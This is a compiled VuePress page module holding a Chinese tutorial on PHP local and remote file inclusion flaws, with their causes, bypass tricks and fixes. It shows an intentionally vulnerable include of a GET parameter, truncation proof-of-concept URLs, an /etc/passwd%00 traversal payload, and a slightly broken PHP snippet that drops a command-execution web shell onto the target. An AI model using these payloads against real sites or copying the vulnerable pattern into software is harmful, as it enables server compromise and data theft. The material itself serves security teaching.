import{_ as n,p as s,q as e,Y as t,s as a}from"./framework-cfcd8ab0.js";const p={},l=t(`<h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><blockquote><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p></blockquote><h3 id="php-文件包含函数" tabindex="-1"><a class="header-anchor" href="#php-文件包含函数" aria-hidden="true">#</a> PHP 文件包含函数</h3><ul><li><code>require()</code> =&gt; 只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。</li><li><code>include()</code> =&gt; 执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行。</li><li><code>require_once()</code> 和<code>include_once()</code> =&gt; 若文件中代码已被包含则不会再次包含。与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</li></ul><p><mark>代码分析</mark></p><div class="language-php" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;page&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h3 id="文件包含绕过" tabindex="-1"><a class="header-anchor" href="#文件包含绕过" aria-hidden="true">#</a> 文件包含绕过</h3><h4 id="_00截断" tabindex="-1"><a class="header-anchor" href="#_00截断" aria-hidden="true">#</a> %00截断</h4><p>截断漏洞出现的核心就是<code>chr(0)</code>，这个字符不为空 (Null)，也不是空字符 (&quot;&quot;)，更不是空格。当程序在输出含有 chr(0) 变量时，chr(0) 后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。</p><ul><li>条件</li></ul><div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token key attr-name">allow_url_fopen</span> <span class="token punctuation">=</span> <span class="token value attr-value">off</span>
<span class="token key attr-name">magic_quotes_gpc</span> <span class="token punctuation">=</span> <span class="token value attr-value">off</span>
php_version &lt; 5.3.4
</code></pre></div><h4 id="点号截断" tabindex="-1"><a class="header-anchor" href="#点号截断" aria-hidden="true">#</a> 点号截断</h4><p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。所以用<code>......</code>绕过的时候 Windows 系统中，点号需要长于 256；Linux 系统中点号要长于 4096。</p><ul><li>POC</li></ul><div class="language-http" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//xx.xx.xx.xx/web/baohan/index.php?page=phpinfo.php.......................................</span></span>
</code></pre></div><h4 id="长路径截断" tabindex="-1"><a class="header-anchor" href="#长路径截断" aria-hidden="true">#</a> 长路径截断</h4><p>原理同上。</p><ul><li>POC</li></ul><div class="language-http" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//xx.xx.xx.xx/web/baohan/index.php?page=phpinfo.php./././././././././././././././././././././</span></span>
</code></pre></div><h4 id="远程文件包含" tabindex="-1"><a class="header-anchor" href="#远程文件包含" aria-hidden="true">#</a> 远程文件包含</h4><ul><li>条件</li></ul><div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token key attr-name">allow_url_include</span> <span class="token punctuation">=</span> <span class="token value attr-value">On</span>
</code></pre></div><p>如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的时候就不要做成<code>.php</code>的文件，一般做成<code>.txt</code>的文件，再让它包含过来。</p><h2 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h2><ul><li>Web 服务器的文件被外界浏览导致信息泄露。</li><li>脚本被任意执行，典型影响如下： <ul><li>篡改网站。</li><li>执行非法操作。</li><li>攻击其他网站。</li></ul></li></ul><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><ul><li>过滤<code>../</code>，<code>./</code>。</li><li>配置<code>php.ini</code>文件。</li><li>关闭<code>allow_url_fopen</code>和<code>allow_url_include</code>。</li><li>设置白名单。</li></ul><h2 id="测试方法" tabindex="-1"><a class="header-anchor" href="#测试方法" aria-hidden="true">#</a> 测试方法</h2><p>让测试目标访问搭建好的 <strong>VPS</strong> 网站，将POC文件保存为 <strong>hack.txt</strong>。</p><p>POC：</p><div class="language-php" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;hack.php&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;w&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&lt;?php system($_GET[x];?&gt;&#39;</span><span class="token punctuation">;</span>
	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div>`,31),o=a("div",{class:"custom-container info"},[a("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[a("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[a("circle",{cx:"12",cy:"12",r:"9"}),a("path",{d:"M12 8h.01"}),a("path",{d:"M11 12h1v4h1"})])]),a("p",{class:"custom-container-title"},"提示"),a("p",null,"php 内核是由 C 语言写的，因此也使用了 c 语言中的字符串处理函数，在连接字符串时，0 字节（\\x00）将作为字符串结束符，攻击者可以在 Web 中尝试使用 ../../etc/passwd%00 截断后面拼接的文件后缀名，或者 ../../etc/passwd\\0。")],-1),c=[l,o];function i(d,r){return s(),e("div",null,c)}const h=n(p,[["render",i],["__file","LFR.html.vue"]]);export{h as default};
